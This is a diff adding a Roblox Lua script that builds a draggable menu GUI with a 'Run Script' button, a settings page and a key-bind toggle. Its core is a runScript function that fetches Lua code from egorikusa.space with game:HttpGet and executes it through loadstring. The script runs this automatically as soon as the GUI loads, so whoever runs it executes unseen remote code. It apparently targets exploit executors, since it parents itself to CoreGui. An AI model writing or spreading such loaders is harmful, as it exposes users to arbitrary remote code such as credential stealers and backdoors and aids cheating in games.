@@ -1,0 +1,135 @@
+-- Create GUI
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local Page1 = Instance.new("Frame")
+local Page2 = Instance.new("Frame")
+local ToggleButton = Instance.new("TextButton")
+local ActionButton = Instance.new("TextButton")
+local SettingsButton = Instance.new("TextButton")
+local KeyBindLabel = Instance.new("TextLabel")
+local KeyBindInput = Instance.new("TextBox")
+
+-- Parent GUI to CoreGui for proper layering
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.IgnoreGuiInset = true
+
+-- Main Frame Properties
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+MainFrame.Position = UDim2.new(0.4, 0, 0.4, 0)
+MainFrame.Size = UDim2.new(0, 400, 0, 300)
+MainFrame.Visible = true
+MainFrame.Active = true
+MainFrame.Draggable = true -- Allows movement
+
+-- Page1 Properties
+Page1.Parent = MainFrame
+Page1.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+Page1.Size = UDim2.new(1, 0, 1, 0)
+
+-- Page2 Properties
+Page2.Parent = MainFrame
+Page2.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+Page2.Size = UDim2.new(1, 0, 1, 0)
+Page2.Visible = false
+
+-- Action Button Properties (Page1)
+ActionButton.Parent = Page1
+ActionButton.BackgroundColor3 = Color3.new(0.1, 0.6, 0.1)
+ActionButton.Position = UDim2.new(0.25, 0, 0.4, 0)
+ActionButton.Size = UDim2.new(0.5, 0, 0.2, 0)
+ActionButton.Text = "Run Script"
+ActionButton.TextScaled = true
+
+-- Settings Button Properties (Page1)
+SettingsButton.Parent = Page1
+SettingsButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.8)
+SettingsButton.Position = UDim2.new(0.25, 0, 0.7, 0)
+SettingsButton.Size = UDim2.new(0.5, 0, 0.2, 0)
+SettingsButton.Text = "Settings"
+SettingsButton.TextScaled = true
+
+-- Key Bind Label (Page2)
+KeyBindLabel.Parent = Page2
+KeyBindLabel.BackgroundTransparency = 1
+KeyBindLabel.Position = UDim2.new(0.1, 0, 0.3, 0)
+KeyBindLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
+KeyBindLabel.Text = "Press a key to bind for toggling the GUI:"
+KeyBindLabel.TextScaled = true
+KeyBindLabel.TextColor3 = Color3.new(1, 1, 1)
+
+-- Key Bind Input (Page2)
+KeyBindInput.Parent = Page2
+KeyBindInput.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
+KeyBindInput.Position = UDim2.new(0.25, 0, 0.6, 0)
+KeyBindInput.Size = UDim2.new(0.5, 0, 0.2, 0)
+KeyBindInput.Text = "Press Key"
+KeyBindInput.TextScaled = true
+KeyBindInput.ClearTextOnFocus = false
+
+-- Toggle Button Properties
+ToggleButton.Parent = ScreenGui
+ToggleButton.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+ToggleButton.Position = UDim2.new(0, 10, 0, 10)
+ToggleButton.Size = UDim2.new(0, 100, 0, 50)
+ToggleButton.Text = "Toggle GUI"
+ToggleButton.TextScaled = true
+ToggleButton.TextColor3 = Color3.new(1, 1, 1)
+ToggleButton.BackgroundTransparency = 0.2
+ToggleButton.Active = true
+ToggleButton.Draggable = true -- Allows movement
+
+-- Variables
+local UserInputService = game:GetService("UserInputService")
+local currentKeyBind = Enum.KeyCode.F -- Default keybind
+
+-- Function to run the script
+local function runScript()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://egorikusa.space/35c8151830a6c3c13ce1a6b8.lua", true))()
+    end)
+    if not success then
+        warn("Failed to execute script: " .. tostring(err))
+    end
+end
+
+-- Execute script on GUI load
+runScript()
+
+-- Switch between pages
+SettingsButton.MouseButton1Click:Connect(function()
+    Page1.Visible = false
+    Page2.Visible = true
+end)
+
+-- Return to Page1 from Page2
+KeyBindInput.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        Page1.Visible = true
+        Page2.Visible = false
+    end
+end)
+
+-- Key binding functionality
+KeyBindInput.Focused:Connect(function()
+    KeyBindInput.Text = "Press a Key..."
+end)
+
+UserInputService.InputBegan:Connect(function(input)
+    if KeyBindInput:IsFocused() then
+        currentKeyBind = input.KeyCode
+        KeyBindInput.Text = tostring(currentKeyBind):gsub("Enum.KeyCode.", "")
+    elseif input.KeyCode == currentKeyBind then
+        MainFrame.Visible = not MainFrame.Visible
+    end
+end)
+
+-- Toggle GUI visibility with the toggle button
+ToggleButton.MouseButton1Click:Connect(function()
+    MainFrame.Visible = not MainFrame.Visible
+end)
+
+-- Action button runs the script
+ActionButton.MouseButton1Click:Connect(function()
+    runScript()
+end)
